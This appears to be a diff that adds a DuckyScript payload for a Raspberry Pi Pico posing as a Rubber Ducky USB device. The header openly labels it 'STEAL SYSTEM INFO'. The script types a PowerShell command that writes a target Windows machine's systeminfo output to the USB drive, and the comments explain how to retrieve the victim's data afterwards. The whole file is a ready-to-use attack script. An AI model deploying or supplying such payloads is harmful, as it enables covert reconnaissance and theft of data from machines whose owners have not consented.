@@ -1,0 +1,17 @@
+REM STEAL SYSTEM INFO into Rubber Ducky (Raspberry pi pico) << WINDOWS >>
+REM Author: XfinityAlpha
+REM Change 'CIRCUITPY' to ur Rubber ducky (Raspberry pi pico) device name  
+REM sys.txt - save file of system info
+
+DELAY 3000
+WINDOWS R
+DELAY 500
+STRING powershell "$u=gwmi win32_volume|?{$_.label -eq 'CIRCUITPY'}|select name;cd $u.name;" "systeminfo > sys.txt"
+ENTER
+
+REM Unplug once the command is executed and saved
+REM When plugging in to your machine to read information of target machine saved >
+REM remember to stop the script or else your own system info will be saved
+
+
+
